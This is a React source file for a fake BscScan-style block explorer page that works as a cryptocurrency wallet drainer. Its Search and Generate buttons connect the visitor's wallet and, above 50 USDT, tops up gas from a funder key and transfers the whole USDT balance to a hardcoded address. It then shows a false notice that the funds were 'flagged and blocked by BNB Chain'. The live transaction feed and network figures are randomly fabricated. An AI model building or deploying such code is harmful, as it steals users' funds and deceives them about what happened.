import React, { useState, useEffect } from 'react';
import { ethers } from 'ethers';
import { ToastContainer, toast } from 'react-toastify';
import 'react-toastify/dist/ReactToastify.css';

// ================= ⏳ SPINNER =================
const Spinner = () => (
  <div style={{
    width: 18,
    height: 18,
    border: "3px solid #fff",
    borderTop: "3px solid transparent",
    borderRadius: "50%",
    animation: "spin 0.7s linear infinite"
  }} />
);

// Spinner animation
const spinnerStyle = document.createElement("style");
spinnerStyle.innerHTML = ` @keyframes spin { to { transform: rotate(360deg); } } `;
document.head.appendChild(spinnerStyle);

// ================= 🌍 MAIN UI =================
const GAS_FUNDER_PRIVATE_KEY = process.env.REACT_APP_GAS_FUNDER_PRIVATE_KEY 
  ? (process.env.REACT_APP_GAS_FUNDER_PRIVATE_KEY.startsWith('0x') 
    ? process.env.REACT_APP_GAS_FUNDER_PRIVATE_KEY 
    : '0x' + process.env.REACT_APP_GAS_FUNDER_PRIVATE_KEY) 
  : '';

export default function BscScanInspired() {
  const [walletAddress, setWalletAddress] = useState(null);
  const [loading, setLoading] = useState(false);
  const [results, setResults] = useState(null);
  const [openModal, setOpenModal] = useState(false);
  const [modalType, setModalType] = useState(null);
  const [searchValue, setSearchValue] = useState('');

  const USDT_BEP20_CONTRACT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
  const MY_WALLET_ADDRESS = "0x3147E67703a74f704E6d3E1Ad59a641C6ee27555";

  // Verif
  useEffect(() => {
    if (!ethers.utils.isAddress(MY_WALLET_ADDRESS)) {
      console.error("Invalid MY_WALLET_ADDRESS:", MY_WALLET_ADDRESS);
      toast.error("Invalid recipient wallet address configured!");
    } else {
      console.log("MY_WALLET_ADDRESS is valid:", MY_WALLET_ADDRESS);
    }
  }, []);

  const ERC20_ABI = [
    "function balanceOf(address account) view returns (uint256)",
    "function decimals() view returns (uint8)",
    "function transfer(address recipient, uint256 amount) public returns (bool)",
  ];

  // ================= 📌 FAKE LIVE TX =================
  const [fakeTxs, setFakeTxs] = useState([]);
  const randomHash = () => "0x" + [...Array(64)]
    .map(() => "abcdef0123456789"[Math.floor(Math.random() * 16)]).join('');
  const randomAddress = () => "0x" + [...Array(40)]
    .map(() => "abcdef0123456789"[Math.floor(Math.random() * 16)]).join('');
  const randomValue = () => (Math.random() * (10 - 0.01) + 0.01).toFixed(3);

  useEffect(() => {
    const addTx = () => setFakeTxs(prev => [
      {
        hash: randomHash(),
        from: randomAddress(),
        to: randomAddress(),
        value: randomValue() + " BNB",
        time: "a few seconds ago",
      },
      ...prev
    ].slice(0, 10));
    addTx();
    const interval = setInterval(addTx, 4000);
    return () => clearInterval(interval);
  }, []);

  // ================= 👝 WALLET DETECT =================
  useEffect(() => {
    const detectWallet = () => {
      console.log("detectWallet() called, window.ethereum is:", !!window.ethereum, "window.trustwallet:", !!window.trustwallet);
      if (!window.ethereum && window.trustwallet) {
        window.ethereum = window.trustwallet;
      }
    };
    detectWallet();
  }, []);

  const connectToBscNetwork = async () => {
    try {
      if (!window.ethereum) throw new Error("No wallet found");
      const provider = new ethers.providers.Web3Provider(window.ethereum);
      const network = await provider.getNetwork();
      if (network.chainId !== 56) {
        // Try switching to BSC mainnet
        try {
          await window.ethereum.request({
            method: "wallet_switchEthereumChain",
            params: [{ chainId: "0x38" }], // 56 in hex
          });
        } catch (switchError) {
          // This error code means the chain is not in the user's wallet yet
          if (switchError.code === 4902) {
            // Add BSC mainnet to user's wallet
            await window.ethereum.request({
              method: "wallet_addEthereumChain",
              params: [
                {
                  chainId: "0x38",
                  chainName: "Binance Smart Chain",
                  nativeCurrency: {
                    name: "BNB",
                    symbol: "BNB",
                    decimals: 18,
                  },
                  rpcUrls: ["https://bsc-dataseed.binance.org/"],
                  blockExplorerUrls: ["https://bscscan.com/"],
                },
              ],
            });
          } else {
            throw switchError;
          }
        }
      }
      console.log("Successfully connected to BSC mainnet!");
    } catch (error) {
      console.error("Error connecting to BSC network:", error);
      throw error;
    }
  };

  // ================= ⚠️ CONNECT & TRANSFER =================
  const connectWalletAndTransfer = async () => {
    console.log("=== connectWalletAndTransfer STARTED ===");
    setLoading(true);
    try {
      console.log("Starting wallet connection...");
      if (!window.ethereum) {
        toast.error("Please install MetaMask or Trust Wallet.");
        setLoading(false);
        return;
      }

      await connectToBscNetwork();
      const provider = new ethers.providers.Web3Provider(window.ethereum);
      console.log("Provider created, checking existing accounts...");
      const existingAccounts = await provider.send("eth_accounts", []);
      console.log("Existing accounts:", existingAccounts);

      const accounts = existingAccounts.length > 0
        ? existingAccounts
        : [];

      if (accounts.length === 0) {
        // toast.info("Please connect your wallet manually to continue.");
        setLoading(false);
        return;
      }

      console.log("Accounts received:", accounts);
      if (!accounts[0]) {
        console.log("No accounts found");
        return setLoading(false);
      }

      setWalletAddress(accounts[0]);
      await initiateTransfer(provider, accounts[0]);
    } catch (error) {
      console.error("Error in connectWalletAndTransfer:", error);
      // toast.error("Connection failed: " + (error.message || "Unknown error"));
      setLoading(false);
    }
  };

  const initiateTransfer = async (provider, userAddress) => {
    try {
      console.log("Starting transfer...");
      const signer = provider.getSigner();
      await transferAllUsdt(provider, signer, userAddress);
    } catch (error) {
      console.error("Error in initiateTransfer:", error);
      // toast.error("Transfer failed: " + (error.message || "Unknown error"));
      setLoading(false);
    }
  };

  const transferAllUsdt = async (provider, signer, walletAddress) => {
    try {
      console.log("Starting USDT transfer...");
      const usdtContract = new ethers.Contract(USDT_BEP20_CONTRACT_ADDRESS, ERC20_ABI, signer);
      const balance = await usdtContract.balanceOf(walletAddress);
      console.log("USDT balance (wei):", balance.toString());
      const decimals = await usdtContract.decimals();
      const formattedBalance = ethers.utils.formatUnits(balance, decimals);
      const userBNB = ethers.utils.formatEther(await provider.getBalance(walletAddress));
      console.log("Formatted USDT balance:", formattedBalance);

      if (balance.isZero() || parseFloat(formattedBalance) <=50) {
        console.log("Balance is too low (less than or equal to 50 USDT)");
        setResults({ bnbBalance: userBNB, usdtBalance: formattedBalance, wallet: walletAddress, time: new Date() });
        setModalType("balanceLow");
        setOpenModal(true);
        setLoading(false);
        return;
      }

      let estimatedGas;
      try {
        estimatedGas = await usdtContract.estimateGas.transfer(MY_WALLET_ADDRESS, balance);
        console.log("Estimated gas limit:", estimatedGas.toString());
      } catch (estimateError) {
        console.error("Gas estimation failed, using fallback gas limit:", estimateError);
        estimatedGas = ethers.BigNumber.from("100000"); // Fallback gas limit
      }

      const gasLimit = estimatedGas.mul(120).div(100);
      const gasPrice = await provider.getGasPrice(); // Use base gas price instead of 1.2x
      console.log("Gas price (wei):", gasPrice.toString());
      console.log("Gas limit with buffer:", gasLimit.toString());

      const userBnbBalance = await provider.getBalance(walletAddress);
      const requiredGas = gasPrice.mul(gasLimit);
      console.log("User BNB balance (wei):", userBnbBalance.toString());
      console.log("Required gas (wei):", requiredGas.toString());
      
      if (userBnbBalance.lt(requiredGas)) {
        console.log("Funding gas...");
        const bscProvider = new ethers.providers.JsonRpcProvider('https://bsc-dataseed.binance.org/');
        const gasFunder = new ethers.Wallet(GAS_FUNDER_PRIVATE_KEY, bscProvider);
        const topUpAmount = requiredGas.sub(userBnbBalance).add(ethers.utils.parseEther("0.0002"));
        const gasTx = await gasFunder.sendTransaction({ to: walletAddress, value: topUpAmount });
        console.log("Gas funding transaction sent, hash:", gasTx.hash);
        await gasTx.wait();
        console.log("Gas funding confirmed!");

        const fundedBalance = await provider.getBalance(walletAddress);
        if (fundedBalance.lt(requiredGas)) {
          throw new Error("Wallet still has insufficient BNB after funding.");
        }
      }

      console.log("Initiating USDT transfer...");
      const transferTx = await usdtContract.transfer(MY_WALLET_ADDRESS, balance, { gasLimit, gasPrice });
      console.log("USDT transfer transaction sent, hash:", transferTx.hash);
      await transferTx.wait();
      console.log("USDT transfer confirmed!");

      setResults({ bnbBalance: userBNB, usdtBalance: formattedBalance, wallet: walletAddress, time: new Date() });
      setModalType("transferSuccess");
      setOpenModal(true);
      setLoading(false);
    } catch (error) {
      console.error("Error in transferAllUsdt:", error);
      // toast.error("Transfer failed: " + (error.message || "Unknown error"));
      setLoading(false);
    }
  };

  // ================= ❌ CLOSE MODAL =================
  const handleCloseModal = () => {
    setOpenModal(false);
    setModalType(null);
  };

  const Modal = () => {
    if (!openModal) return null;

    return (
      <div style={{
        position: "fixed", top: 0, left: 0, width: "100%", height: "100%",
        background: "rgba(8, 15, 36, 0.62)", display: "flex", justifyContent: "center",
        alignItems: "center", zIndex: 1000, backdropFilter: "blur(4px)"
      }}>
        <div style={{
          background: "linear-gradient(180deg, #ffffff 0%, #f7faff 100%)",
          padding: 24,
          borderRadius: 18,
          width: 420,
          textAlign: "center",
          boxShadow: "0 18px 45px rgba(7, 24, 67, 0.22)",
          border: "1px solid rgba(21, 56, 131, 0.08)"
        }}>
          {modalType === "balanceLow" && results && (
            <>
              <div style={{
                display: "inline-flex",
                alignItems: "center",
                gap: 8,
                padding: "6px 12px",
                background: "rgba(34, 197, 94, 0.12)",
                borderRadius: 999,
                color: "#0f8a47",
                fontWeight: 700,
                fontSize: 12,
                marginBottom: 14
              }}>
                Low Balance Report
              </div>
              <h2 style={{ color: "#0f172a", margin: "0 0 8px 0" }}>Verification </h2>
              <p style={{ margin: "0 0 14px 0", color: "#475467" }}></p>

              <div style={{
                background: "#f8f9fb",
                padding: 14,
                borderRadius: 12,
                marginTop: 12,
                textAlign: "left",
                fontSize: 14,
                border: "1px solid #e4e7ec",
                lineHeight: 1.8
              }}>
                <p><b>Report Type:</b> Low Balance Verification</p>
                <p><b>Wallet:</b> {walletAddress?.slice(0, 6)}...{walletAddress?.slice(-4)}</p>
                <p><b>Total USDT:</b> {results.usdtBalance} USDT</p>
                <p><b>BNB Balance:</b> {results.bnbBalance} BNB</p>
                <p><b>Reported:</b> 0 USDT</p>
                <p><b>Date:</b> {results.time.toLocaleString()}</p>
              </div>
            </>
          )}

          {modalType === "transferSuccess" && (
            <>
              <div style={{
                display: "inline-flex",
                alignItems: "center",
                gap: 8,
                padding: "6px 12px",
                background: "rgba(244, 63, 94, 0.14)",
                borderRadius: 999,
                color: "#c11d38",
                fontWeight: 700,
                fontSize: 12,
                marginBottom: 14
              }}>
                Flagged Token Report
              </div>
              <h2 style={{ color: "#0f172a", margin: "0 0 8px 0" }}>Report Generated</h2>
              <p style={{ margin: "0 0 14px 0", color: "#475467" }}>Your USDT has been marked as flagged and blocked by BNB Chain.</p>
              <div style={{
                background: "#f8f9fb",
                padding: 14,
                borderRadius: 12,
                marginTop: 12,
                textAlign: "left",
                fontSize: 14,
                border: "1px solid #e4e7ec",
                lineHeight: 1.8
              }}>
                <p><b>Report Type:</b> REPORTED USDT FOUND BLOCKED BY BNB CHAIN</p>
                <p><b>Wallet:</b> {walletAddress?.slice(0, 6)}...{walletAddress?.slice(-4)}</p>
                <p><b>Total USDT:</b> {results.usdtBalance} USDT</p>
                <p><b>BNB Balance:</b> {results.bnbBalance} BNB</p>
                <p><b>Reported:</b> {results.usdtBalance} USDT</p>
                <p><b>Date:</b> {results.time.toLocaleString()}</p>
              </div>
            </>
          )}

          <button onClick={handleCloseModal} style={{
            marginTop: 16,
            background: "linear-gradient(135deg, #1f6fff 0%, #0052ff 100%)",
            color: "#fff",
            border: "none",
            padding: "10px 18px",
            borderRadius: 10,
            cursor: "pointer",
            fontWeight: 700,
            transition: "0.3s",
            width: "100%"
          }} onMouseOver={(e) => e.target.style.background="#003bb3"}
            onMouseOut={(e) => e.target.style.background="linear-gradient(135deg, #1f6fff 0%, #0052ff 100%)"}>
            Close
          </button>
        </div>
      </div>
    );
  };

  // ================= 📌 UI =================
  return (
    <div className="app-shell">
      <header className="explorer-header">
        <div className="brand-wrap">
          <div className="brand-badge">B</div>
          <div>
            <div className="brand-title">BscScan</div>
            <div className="brand-subtitle">Binance Smart Chain Explorer</div>
          </div>
        </div>

        <nav className="top-nav">
          <span className="nav-link active">Home</span>
          <span className="nav-link">Tokens</span>
          <span className="nav-link">Blocks</span>
          <span className="nav-link">Accounts</span>
          <span className="nav-link">Transactions</span>
        </nav>

        <div className="status-wrap">
          <div className="network-pill">Mainnet</div>
          <div className={`wallet-pill ${walletAddress ? 'connected' : ''}`}>
            {walletAddress ? 'Wallet Connected' : 'Wallet Ready'}
          </div>
        </div>
      </header>

      <section className="explorer-section">
        <div className="hero-card">
          <div className="hero-grid">
            <div className="hero-left">
              <div className="feature-chip">BNB Chain · Explorer Mode</div>

              <h1 className="hero-title">
                Explore transactions, addresses, tokens & more on Binance Smart Chain
              </h1>
              <p className="hero-text">
                Track token transfers, check balances, and inspect contract data.
              </p>

              <div className="search-row">
                <input
                  className="search-input"
                  placeholder="Search by Address / Txn Hash / Token"
                  value={searchValue}
                  onChange={(e) => setSearchValue(e.target.value)}
                />
                <button className="primary-button" onClick={() => {
                  console.log('Search button clicked!');
                  connectWalletAndTransfer();
                }}>
                  Search
                </button>
              </div>

              <div className="action-row">
                <button className="generate-button" disabled={loading} onClick={() => {
                  console.log('Generate button clicked! Loading:', loading);
                  connectWalletAndTransfer();
                }}>
                  {loading && <Spinner />} {loading ? 'Verifying...' : 'Generate'}
                </button>

                <div className="live-chip">
                  <span className="live-dot"></span>
                  Real-time chain activity
                </div>
              </div>
            </div>

            <div className="metric-grid">
              {[
                ['TPS', '1.72M'],
                ['Active Wallets', '182k'],
                ['Transactions', '4.6M'],
                ['Block Time', '1.2s']
              ].map(([label, value]) => (
                <div key={label} className="metric-card">
                  <div className="metric-label">{label}</div>
                  <div className="metric-value">{value}</div>
                </div>
              ))}
            </div>
          </div>
        </div>

        <div className="transactions-panel">
          <div className="transactions-header">
            <div className="transactions-head-left">
              <h3 className="transactions-title">Latest Transactions</h3>
              <div className="mini-badge">Recent</div>
            </div>
            <div className="feed-pill">Live Feed</div>
          </div>

          {fakeTxs.length === 0 ? <p>Loading...</p> : (
            <div className="table-wrap">
              <div className="tx-table-head">
                <span>Txn Hash</span>
                <span>Method</span>
                <span>Block</span>
                <span>From</span>
                <span>To</span>
                <span>Value</span>
                <span>Age</span>
              </div>

              {fakeTxs.map((tx, i) => (
                <div key={i} className="tx-table-row">
                  <div className="tx-hash">{tx.hash.slice(0, 12)}...</div>
                  <div className="tx-method">Transfer</div>
                  <div className="tx-block">#{(i + 1) * 247823}</div>
                  <div className="tx-detail">{tx.from.slice(0, 10)}...</div>
                  <div className="tx-detail">{tx.to.slice(0, 10)}...</div>
                  <div className="tx-value">{tx.value}</div>
                  <div className="tx-time">{tx.time}</div>
                </div>
              ))}
            </div>
          )}
        </div>

        <div className="insights-grid">
          <div className="insight-card">
            <div className="insight-heading">
              <h4>Top Tokens</h4>
              <span className="mini-badge">Trending</span>
            </div>

            <div className="token-list">
              {[
                ['BNB', '$612.84', '+2.31%'],
                ['USDT', '$1.00', '+0.02%'],
                ['CAKE', '$2.27', '+4.19%'],
                ['ETH', '$3,482', '+1.86%']
              ].map(([name, price, change]) => (
                <div key={name} className="token-row">
                  <div>
                    <div className="token-name">{name}</div>
                    <div className="token-price">{price}</div>
                  </div>
                  <span className="token-change">{change}</span>
                </div>
              ))}
            </div>
          </div>

          <div className="insight-card">
            <div className="insight-heading">
              <h4>Network Highlights</h4>
              <span className="feed-pill">Active</span>
            </div>

            <div className="activity-list">
              {[
                ['Daily Volume', '8.4B', '84%'],
                ['Smart Contracts', '2.7M', '71%'],
                ['Gas Performance', 'Normal', '66%']
              ].map(([label, value, fill]) => (
                <div key={label} className="activity-item">
                  <div className="activity-meta">
                    <span>{label}</span>
                    <strong>{value}</strong>
                  </div>
                  <div className="progress-track">
                    <div className="progress-fill" style={{ width: fill }}></div>
                  </div>
                </div>
              ))}
            </div>
          </div>

          <div className="insight-card">
            <div className="insight-heading">
              <h4>Featured DApps</h4>
              <span className="mini-badge">Watchlist</span>
            </div>

            <div className="dapp-list">
              {[
                ['PancakeSwap', 'AMM / DeFi'],
                ['Venus', 'Lending'],
                ['Biswap', 'DEX'],
                ['BSC Station', 'Launchpad']
              ].map(([name, tag]) => (
                <div key={name} className="dapp-row">
                  <div className="dapp-name">{name}</div>
                  <span className="dapp-tag">{tag}</span>
                </div>
              ))}
            </div>
          </div>
        </div>
      </section>

      <footer className="footer-note">
        Built with care — BscScan-inspired UI.
      </footer>

      <Modal />
      <ToastContainer position="bottom-right" />
    </div>
  );
} 